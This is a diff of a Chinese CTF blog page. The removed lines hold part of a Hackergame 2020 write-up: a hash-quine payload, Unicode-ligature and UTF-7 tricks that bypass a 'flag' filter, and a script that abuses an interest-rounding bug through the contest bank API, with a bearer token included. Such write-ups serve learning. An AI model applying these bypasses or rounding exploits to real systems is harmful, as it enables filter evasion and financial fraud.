-
-<p>直接跑脚本得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我攻破了 Ｈａｃｋｅｒｇａｍｅ 的服务器，偷到了它们的 ｆｌａｇ，现在我把 ｆｌａｇ 发给你： ｆｌａｇ｛Ｈ４ｖ３＿ＦｕＮ＿ｗ１Ｔｈ＿３ｎｃ０ｄ１ｎｇ＿４Ｎｄ＿ｄ３ｃ０Ｄ１ｎＧ＿９ｑＤ２Ｒ８ｈｓ｝ 快去比赛平台提交吧！ 不要再把这份信息转发给其他人了，要是被发现就糟糕了！</span><br></pre></td></tr></table></figure>
-
-<p>8.自复读的复读机</p>
-<p>(2)哈希复读</p>
-<p>直接上payload，看到题解才知道第一题都做出来了，第二题离我有多近，当时多想一会儿就好了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import hashlib;s&#x3D;&#39;import  hashlib;s&#x3D;%r;print(hashlib.sha256((s%%s).encode()).hexdigest(),end&#x3D;&quot;&quot;)&#39;;print(hashlib.sha256((s%s).encode()).hexdigest(),end&#x3D;&quot;&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>不解释了QAQ</p>
-<p>9.233同学的字符串工具</p>
-<p>给了源码了，直接先贴源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">def to_upper(s):</span><br><span class="line">    r &#x3D; re.compile(&#39;[fF][lL][aA][gG]&#39;)</span><br><span class="line">    if r.match(s):</span><br><span class="line">        print(&#39;how dare you&#39;)</span><br><span class="line">    elif s.upper() &#x3D;&#x3D; &#39;FLAG&#39;:</span><br><span class="line">        print(&#39;yes, I will give you the flag&#39;)</span><br><span class="line">        print(open(&#39;&#x2F;flag1&#39;).read())</span><br><span class="line">    else:</span><br><span class="line">        print(&#39;%s&#39; % s.upper())</span><br><span class="line"></span><br><span class="line">def to_utf8(s):</span><br><span class="line">    r &#x3D; re.compile(&#39;[fF][lL][aA][gG]&#39;)</span><br><span class="line">    s &#x3D; s.encode() # make it bytes</span><br><span class="line">    if r.match(s.decode()):</span><br><span class="line">        print(&#39;how dare you&#39;)</span><br><span class="line">    elif s.decode(&#39;utf-7&#39;) &#x3D;&#x3D; &#39;flag&#39;:</span><br><span class="line">        print(&#39;yes, I will give you the flag&#39;)</span><br><span class="line">        print(open(&#39;&#x2F;flag2&#39;).read())</span><br><span class="line">    else:</span><br><span class="line">        print(&#39;%s&#39; % s.decode(&#39;utf-7&#39;))</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&#39;Welcome to the best string tool here!&#39;)</span><br><span class="line">    print(&#39;Brought to you by 233 PROUDLY&#39;)</span><br><span class="line">    print(&#39;&#39;)</span><br><span class="line">    print(&#39;Which tool do you want?&#39;)</span><br><span class="line">    print(&#39;1. Convert my string to UPPERCASE!!&#39;)</span><br><span class="line">    print(&#39;2. Convert my UTF-7 string to UTF-8!!&#39;)</span><br><span class="line">    choice &#x3D; input()</span><br><span class="line">    if choice[0] &#x3D;&#x3D; &#39;1&#39;:</span><br><span class="line">        print(&#39;Welcome to the capitalizer tool, please input your string: &#39;)</span><br><span class="line">        to_upper(input())</span><br><span class="line">    elif choice[0] &#x3D;&#x3D; &#39;2&#39;:</span><br><span class="line">        print(&#39;Welcome to the UTF-7-&gt;UTF-8 tool, please input your string: &#39;)</span><br><span class="line">        to_utf8(input())</span><br><span class="line">    else:</span><br><span class="line">        print(&#39;I am confused, madam&#39;)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
-
-<p>(1)字符串大写工具</p>
-<p>我的第一想法是通过ascii编码绕过，但是发现并不能成功我很疑惑，python识别不了ascii？我自己写了个脚本验证了一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str1&#x3D;input()</span><br><span class="line">str2&#x3D;&quot;\x61\x62\x63&quot;</span><br><span class="line">if(str1&#x3D;&#x3D;str2):</span><br><span class="line">    print(&quot;没区别&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;有区别&quot;)</span><br><span class="line">print(str1.upper())</span><br><span class="line">print(str2.upper())</span><br></pre></td></tr></table></figure>
-
-<p>输入“abc”和输入“\x61\x62\x63”会分别显示没区别和有区别。查了一下，知道了原生字符串这个概念。就是说，如果我这样构造一个字符串，<code>str3=r&#39;xxxxxxxx&#39;</code>这个字符串会被当做一个原生字符串，并且原生字符串是默认不把反斜杠当成转义符的。而input()得到的字符串，统统被认为是原生字符串(<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/47ce3b98c45d">参考网站</a>)。回想上次n1ctf那个题的python脚本我加了f’’把字符串变成格式化字符串可行吗？当然不可行，最外层肯定是r’’了，加f’’也是在r’’里能有什么用。</p>
-<p>至此我没思路了ORZ。看了题解知道了连字这个东西，赶紧去学。直接<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Unicode/750500?fr=aladdin">百度百科</a>，简单来说，unicode是一个集合，而utf8，utf32之类的只是读取这个集合的方式。而字符集也不止unicode一个，只不过他涵盖语言多适用范围广就是了。比如汉字就有字符集GBK(GB2312)的扩充，属于双字节编码。关于字符集和编码的内容可以看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xdyixia/p/9114145.html">这里</a>。</p>
-<p>连字就是把两个字符拼起来，可能省去一个点或者什么东西，但是很巧的是upper之后会复原。题解也给了<a target="_blank" rel="noopener" href="https://eng.getwisdom.io/hacking-github-with-unicode-dotless-i/">网站</a>了，看到里面有fl的连字ﬂ，直接输入”ﬂag”第一个flag就出来了。</p>
-<p>(2)UTF-7 到 UTF-8 转换工具</p>
-<p>utf8编码规则看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wwlearn/articles/1179799.html">这里</a></p>
-<p>utf7编码规则看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/fvan/archive/2006/02/26/338326.html">这里</a></p>
-<p>PS:utf7这里用的base64编码是修正的，即不是8位一组变6位一组再添0，而是当做双字节(两个8位二进制)读取后6位一组再添0)</p>
-<p>即可以构造<code>+AGY-lag</code>，输入即可得到flag</p>
-<p>*11.从零开始的HTTP链接</p>
-<p>再挖坑，linux也要开始学了呀</p>
-<p>16.狗狗银行</p>
-<p>这个题真的很好。。。储蓄卡利率0.3%，信用卡利率0.5%，但是如果存了167元，167的0.3%就是0.501，四舍五入变成1元，利率就会很接近0.6%比0.5%大，也就是说只要我卡里存了167，相当于就在赚钱。只要办一张信用卡再办很多储蓄卡，通过信用卡转账给每张储蓄卡167元，每天产一块还回信用卡，相当于净资产就在增加，只要储蓄卡办的够多，赚的就越多，只要每天赚的钱比我吃饭花的10块钱多，总资产就会不断增加，等他超过2000就好了。</p>
-<p>我不由得想起我小学三年级刚学四舍五入那会儿，我就有了一个疑问，如果我把一块钱看成两个五毛，四舍五入就变成了两块钱。<del>果然薅羊毛要从娃娃抓起。</del></p>
-<p>直接抓包查看post的数据，然后自己写脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url1&#x3D;&quot;http:&#x2F;&#x2F;202.38.93.111:10100&#x2F;api&#x2F;create&quot;</span><br><span class="line">url2&#x3D;&quot;http:&#x2F;&#x2F;202.38.93.111:10100&#x2F;api&#x2F;transfer&quot;</span><br><span class="line">url3&#x3D;&quot;http:&#x2F;&#x2F;202.38.93.111:10100&#x2F;api&#x2F;eat&quot;</span><br><span class="line">headers&#x3D;&#123;&#39;Content-Type&#39;:&#39;application&#x2F;json;charset&#x3D;utf-8&#39;,</span><br><span class="line">      &#39;Authorization&#39;:&#39;Bearer 3373:MEUCIA13wjtuGzRrp7CH40b2rFnPl1ayGL7r4zMz8kEldXwhAiEAuOIrK+iPT5YWmkfslZuumkBvS9GmJECeoPbagqQEC30&#x3D;&#39;&#125;</span><br><span class="line">data1&#x3D;&#123;&quot;type&quot;:&quot;debit&quot;&#125;</span><br><span class="line">for i in range(200):</span><br><span class="line">  r&#x3D;requests.post(url&#x3D;url1,json&#x3D;data1,headers&#x3D;headers)</span><br><span class="line"></span><br><span class="line">r&#x3D;requests.post(url&#x3D;url1,json&#x3D;&#123;&quot;type&quot;:&quot;credit&quot;&#125;,headers&#x3D;headers)</span><br><span class="line">#Q:为什么这里是json而不是data？</span><br><span class="line">A:要看请求头中Content-Type的内容</span><br><span class="line"></span><br><span class="line">for i in range(2,202):</span><br><span class="line">    data2&#x3D;&#123;&quot;src&quot;:202,&quot;dst&quot;:i,&quot;amount&quot;:167&#125;</span><br><span class="line">    r&#x3D;requests.post(url&#x3D;url2,json&#x3D;data2,headers&#x3D;headers)</span><br><span class="line"></span><br><span class="line">for i in range(100):</span><br><span class="line">    data3&#x3D;&#123;&quot;account&quot;:1&#125;</span><br><span class="line">    r&#x3D;requests.post(url&#x3D;url3,json&#x3D;data3,headers&#x3D;headers)</span><br><span class="line">    for j in range(1,202):</span><br><span class="line">        data4&#x3D;&#123;&quot;src&quot;:j,&quot;dst&quot;:202,&quot;amount&quot;:1&#125;</span><br><span class="line">        r&#x3D;requests.post(url&#x3D;url2,json&#x3D;data4,headers&#x3D;headers)</span><br></pre></td></tr></table></figure>
-
-<p>等一小会儿就有flag了QAQ</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/11/Hackergame2020-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" data-id="ckn4hz0qo000eb0v0e1qgfkn0" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/11/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8Cphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="cknopixj5000dwsv04oh44sr3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -922,6 +911,14 @@ print(r.text)</code></pre>
       <ul>
         
           <li>
+            <a href="/2021/04/18/BUUOJ-WEB-wp/">BUUOJ WEB-wp</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/08/%E5%85%B3%E4%BA%8E%E7%BD%91%E5%85%B3%E3%80%81%E9%9A%A7%E9%81%93%E5%92%8C%E4%B8%AD%E7%BB%A7%E7%9A%84%E7%90%86%E8%A7%A3/">关于网关、隧道和中继的理解</a>
+          </li>
+        
+          <li>
             <a href="/2021/04/05/%E5%85%B3%E4%BA%8EConnection%E9%A6%96%E9%83%A8%E5%92%8C%E5%93%91%E4%BB%A3%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/">关于Connection首部和哑代理的问题</a>
           </li>
         
@@ -931,14 +928,6 @@ print(r.text)</code></pre>
         
           <li>
             <a href="/2021/01/30/Hgame%E9%A2%98%E8%A7%A3/">Hgame题解</a>
-          </li>
-        
-          <li>
-            <a href="/2020/12/23/bugku-web37%E7%9A%84%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E5%81%9A%E6%B3%95/">bugku-web37的时间盲注做法</a>
-          </li>
-        
-          <li>
-            <a href="/2020/12/09/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5%E4%B8%AD%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%BC%82%E6%88%96-sql%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B/">异或注入中字符串的异或-sql的弱类型</a>
           </li>
         
       </ul>
